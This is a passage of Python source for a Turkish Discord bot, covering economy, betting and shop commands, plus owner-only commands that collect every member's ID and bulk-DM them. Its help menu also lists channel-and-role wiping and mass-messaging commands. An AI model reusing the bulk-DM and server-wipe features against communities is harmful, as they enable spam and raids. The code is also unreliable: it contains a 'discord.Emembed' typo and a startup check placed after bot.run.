    ekonomi = ekonomi_yukle()
    guild_id = str(ctx.guild.id)
    user_id = str(ctx.author.id)
    
    if guild_id not in ekonomi:
        ekonomi[guild_id] = {}
    if user_id not in ekonomi[guild_id]:
        ekonomi[guild_id][user_id] = {"para": 0, "son_gunluk": None}
    
    son_gunluk = ekonomi[guild_id][user_id]["son_gunluk"]
    bugün = datetime.now().strftime("%Y-%m-%d")
    
    if son_gunluk == bugün:
        kalan_sure = datetime.now().replace(hour=23, minute=59, second=59) - datetime.now()
        saat = int(kalan_sure.total_seconds() // 3600)
        dakika = int((kalan_sure.total_seconds() % 3600) // 60)
        return await ctx.send(f"⏰ Günlük ödülünü zaten aldın! **{saat}s {dakika}d** sonra tekrar alabilirsin.")
    
    ödül = random.randint(500, 2000)
    ekonomi[guild_id][user_id]["para"] += ödül
    ekonomi[guild_id][user_id]["son_gunluk"] = bugün
    ekonomi_kaydet(ekonomi)
    
    embed = discord.Emembed(
        title="🎁 Günlük Ödül!",
        description=f"**{ödül:,} TL** kazandın!\n**Yeni bakiyen:** {ekonomi[guild_id][user_id]['para']:,} TL",
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)

@bot.command()
async def bahis(ctx, miktar: int):
    if miktar < 100:
        return await ctx.send("❌ Minimum 100 TL bahis yapabilirsin!")
    
    ekonomi = ekonomi_yukle()
    guild_id = str(ctx.guild.id)
    user_id = str(ctx.author.id)
    
    if guild_id not in ekonomi:
        ekonomi[guild_id] = {}
    if user_id not in ekonomi[guild_id]:
        ekonomi[guild_id][user_id] = {"para": 0, "son_gunluk": None}
    
    if ekonomi[guild_id][user_id]["para"] < miktar:
        return await ctx.send("❌ Yeterli paran yok!")
    
    ekonomi[guild_id][user_id]["para"] -= miktar
    
    # %45 kazanma şansı
    if random.randint(1, 100) <= 45:
        kazanc = int(miktar * 1.8)
        ekonomi[guild_id][user_id]["para"] += kazanc
        ekonomi_kaydet(ekonomi)
        
        embed = discord.Embed(
            title="🎉 Bahis Kazandın!",
            description=f"**{kazanc:,} TL** kazandın!\n**Yeni bakiyen:** {ekonomi[guild_id][user_id]['para']:,} TL",
            color=discord.Color.green()
        )
    else:
        ekonomi_kaydet(ekonomi)
        embed = discord.Embed(
            title="💸 Bahis Kaybettin!",
            description=f"**{miktar:,} TL** kaybettin!\n**Yeni bakiyen:** {ekonomi[guild_id][user_id]['para']:,} TL",
            color=discord.Color.red()
        )
    
    await ctx.send(embed=embed)

@bot.command()
async def transfer(ctx, member: discord.Member, miktar: int):
    if member.bot:
        return await ctx.send("❌ Botlara para transfer edemezsin!")
    if member == ctx.author:
        return await ctx.send("❌ Kendine para transfer edemezsin!")
    if miktar < 50:
        return await ctx.send("❌ Minimum 50 TL transfer yapabilirsin!")
    
    ekonomi = ekonomi_yukle()
    guild_id = str(ctx.guild.id)
    gönderen_id = str(ctx.author.id)
    alan_id = str(member.id)
    
    if guild_id not in ekonomi:
        ekonomi[guild_id] = {}
    if gönderen_id not in ekonomi[guild_id]:
        ekonomi[guild_id][gönderen_id] = {"para": 0, "son_gunluk": None}
    if alan_id not in ekonomi[guild_id]:
        ekonomi[guild_id][alan_id] = {"para": 0, "son_gunluk": None}
    
    if ekonomi[guild_id][gönderen_id]["para"] < miktar:
        return await ctx.send("❌ Yeterli paran yok!")
    
    ekonomi[guild_id][gönderen_id]["para"] -= miktar
    ekonomi[guild_id][alan_id]["para"] += miktar
    ekonomi_kaydet(ekonomi)
    
    embed = discord.Embed(
        title="💸 Para Transferi",
        description=f"{ctx.author.mention} ➡️ {member.mention}\n**Miktar:** {miktar:,} TL",
        color=discord.Color.blue()
    )
    await ctx.send(embed=embed)

@bot.command()
async def mağaza(ctx):
    embed = discord.Embed(
        title="🏪 Mağaza",
        description="Para ile satın alabileceğin öğeler:",
        color=discord.Color.gold()
    )
    embed.add_field(
        name="🎨 Renkli Rol",
        value="**Fiyat:** 5,000 TL\n**Komut:** `.satınal renklirol`\nÖzel renkli rol alırsın!",
        inline=False
    )
    embed.add_field(
        name="👑 VIP Rolü",
        value="**Fiyat:** 25,000 TL\n**Komut:** `.satınal vip`\nVIP yetkilerini alırsın!",
        inline=False
    )
    embed.add_field(
        name="💎 Premium Üyelik",
        value="**Fiyat:** 50,000 TL\n**Komut:** `.satınal premium`\nPremium özellikler açılır!",
        inline=False
    )
    await ctx.send(embed=embed)

@bot.command()
async def satınal(ctx, *, öğe):
    ekonomi = ekonomi_yukle()
    guild_id = str(ctx.guild.id)
    user_id = str(ctx.author.id)
    
    if guild_id not in ekonomi:
        ekonomi[guild_id] = {}
    if user_id not in ekonomi[guild_id]:
        ekonomi[guild_id][user_id] = {"para": 0, "son_gunluk": None}
    
    bakiye = ekonomi[guild_id][user_id]["para"]
    
    if öğe.lower() == "renklirol":
        fiyat = 5000
        if bakiye < fiyat:
            return await ctx.send(f"❌ Yeterli paran yok! **{fiyat:,} TL** gerekli, sen **{bakiye:,} TL** var.")
        
        # Renkli rol oluştur
        renk = random.choice([0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0xFF00FF, 0x00FFFF, 0xFFA500, 0x800080])
        rol_adı = f"{ctx.author.display_name}'s Özel Rol"
        
        try:
            rol = await ctx.guild.create_role(name=rol_adı, color=discord.Color(renk), mentionable=False)
            await ctx.author.add_roles(rol)
            
            ekonomi[guild_id][user_id]["para"] -= fiyat
            ekonomi_kaydet(ekonomi)
            
            await ctx.send(f"🎨 **{rol_adı}** rolü satın alındı ve verildı! **{fiyat:,} TL** harcandı.")
        except:
            await ctx.send("❌ Rol oluştururken hata oluştu!")
    
    elif öğe.lower() == "vip":
        fiyat = 25000
        if bakiye < fiyat:
            return await ctx.send(f"❌ Yeterli paran yok! **{fiyat:,} TL** gerekli, sen **{bakiye:,} TL** var.")
        
        # VIP rolü ver
        vip_rol = discord.utils.get(ctx.guild.roles, name="VIP")
        if not vip_rol:
            try:
                vip_rol = await ctx.guild.create_role(name="VIP", color=discord.Color.gold(), mentionable=True)
            except:
                return await ctx.send("❌ VIP rolü oluştururken hata oluştu!")
        
        try:
            await ctx.author.add_roles(vip_rol)
            ekonomi[guild_id][user_id]["para"] -= fiyat
            ekonomi_kaydet(ekonomi)
            await ctx.send(f"👑 **VIP** rolü satın alındı! **{fiyat:,} TL** harcandı.")
        except:
            await ctx.send("❌ Rol verirken hata oluştu!")
    
    elif öğe.lower() == "premium":
        fiyat = 50000
        if bakiye < fiyat:
            return await ctx.send(f"❌ Yeterli paran yok! **{fiyat:,} TL** gerekli, sen **{bakiye:,} TL** var.")
        
        # Premium rolü ver
        premium_rol = discord.utils.get(ctx.guild.roles, name="Premium")
        if not premium_rol:
            try:
                premium_rol = await ctx.guild.create_role(name="Premium", color=discord.Color.purple(), mentionable=True)
            except:
                return await ctx.send("❌ Premium rolü oluştururken hata oluştu!")
        
        try:
            await ctx.author.add_roles(premium_rol)
            ekonomi[guild_id][user_id]["para"] -= fiyat
            ekonomi_kaydet(ekonomi)
            await ctx.send(f"💎 **Premium** üyelik satın alındı! **{fiyat:,} TL** harcandı.")
        except:
            await ctx.send("❌ Rol verirken hata oluştu!")
    
    else:
        await ctx.send("❌ Geçersiz öğe! Mağazaya `.mağaza` ile bakabilirsin.")

# eski müzik sistemi (bozuk) oldugu icin kaldırırdı !!
# ---- KAYIT SİSTEMİ (SADECE OWNER) ----
@bot.command()
async def kayıtuser(ctx):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Bu komutu sadece bot sahibi kullanabilir.")
    count = 0
    for member in ctx.guild.members:
        if not member.bot:
            kayit_ekle(member.id, ctx.guild.id)
            count += 1
    await ctx.send(f"✅ Sunucudaki {count} kullanıcı kaydedildi.")

@bot.command()
async def kayıtuserdm(ctx, *, mesaj):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("❌ Bu komutu sadece bot sahibi kullanabilir.")
    try:
        with open("kullanicilar.json", "r", encoding="utf-8") as f:
            data = json.load(f)
    except FileNotFoundError:
        return await ctx.send("⚠️ Önce kullanıcıları kaydedin.")
    guild_data = data.get(str(ctx.guild.id), {})
    başarılı = 0
    başarısız = 0
    for user_id in guild_data:
        user = ctx.guild.get_member(int(user_id))
        if user and not user.bot:
            try:
                await user.send(mesaj)
                başarılı += 1
            except:
                başarısız += 1
    await ctx.send(f"📩 Mesaj gönderildi. Başarılı: {başarılı}, Başarısız: {başarısız}")

# ---- YARDIM ----
@bot.command()
async def yardım(ctx):
    embed = discord.Embed(title="📜 Yardım Menüsü", color=discord.Color.blurple())
    embed.add_field(name="🛡️ Moderasyon (sen + adminler)",
                    value=".ban → Üyeyi banlar\n.unban → Banı kaldırır\n.kick → Üyeyi atar\n.mute → Üyeyi susturur\n.unmute → Susturmayı kaldırır\n.slowmode → Kanal slowmode ayarlar\n.temizle → Mesajları siler\n.warn → Kullanıcıyı uyarır\n.banlist → Ban listesini gösterir",
                    inline=False)
    embed.add_field(name="⚙️ Sunucu Yönetimi (🚨 sadece sen)",
                    value=".imha → **Kanalları ve rolleri siler**\n.yedekal → Kanal & kategori yapısını kaydeder\n.yedekver → Sunucu yedeğini gösterir\n.templateal → **Sunucu template'ini alır (GLOBAL)**\n.templatever → **Global template'i bu sunucuya uygular**\n.herkeseyaz → Herkese DM atar\n.herkanalayaz → Tüm kanallara mesaj yollar\n.herkesrolver → Herkese belirtilen rolü verir",
                    inline=False)
    embed.add_field(name="🤖 Otomasyon (🚨 sadece sen)",
                    value=".otorol → Yeni gelenlere otomatik rol\n.karşılama → Karşılama mesajı ayarlar\n.ayrılma → Ayrılma mesajı ayarlar\n.filtrekelime → Kötü kelime filtresi",
                    inline=False)
    embed.add_field(name="💰 Ekonomi Sistemi",
                    value=".para → Para durumu\n.günlük → Günlük para\n.bahis → Para bahsi\n.transfer → Para transferi\n.mağaza → Mağazayı gösterir\n.satınal → Mağazadan öğe satın alır",
                    inline=False)
    embed.add_field(name="📒 Kayıt Sistemi (🚨 sadece sen)",
                    value=".kayıtuser → Sunucudaki tüm kullanıcıları kaydeder\n.kayıtuserdm → Kaydedilen herkese DM yollar",
                    inline=False)
    embed.add_field(name="ℹ️ Bilgi (herkes)",
                    value=".ping → Gecikmeyi gösterir\n.userinfo → Kullanıcı bilgisi\n.serverinfo → Sunucu bilgisi\n.yardım → Bu menüyü gösterir",
                    inline=False)
    embed.set_footer(text="🎯 Tam özellikli Discord botu - Neler yok ki tarafından geliştirildi! /n Ai özellikleri eklendi.")
    await ctx.send(embed=embed)

# ---- BOTU ÇALIŞTIR ----
if __name__ == "__main__":
    # Müzik kuyruklarını temizle
    music_queues = {}
    
    # Botu başlat
    print("🤖 Bot başlatılıyor...")
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"❌ Bot başlatılamadı: {e}")
 # FFmpeg kontrolü
    try:
        import subprocess
        result = subprocess.run(['ffmpeg', '-version'], capture_output=True, text=True)
        if result.returncode == 0:
            print("✅ FFmpeg kurulu ve çalışıyor")
        else:
            print("❌ FFmpeg kurulu değil veya çalışmıyor")
    except:
        print("❌ FFmpeg bulunamadı")

# koddaki ffmed ve youtube dl gibi yerlerin olmasının sebebi kodun müzik komutları eklene bilmesini saglamaktır.
# LÜTFEN ASAGIDAKİ YAZIYI SİLMEYİN !!!
# Bu kodlar Neler yok ki tarafından yazılıp acık kaynak olarak herkese sunulmustur satılması yasaktır. !!
# Kodun github linki : https://github.com/neleryokki/Turkce-Genel-Gelismis-Discord-Botu
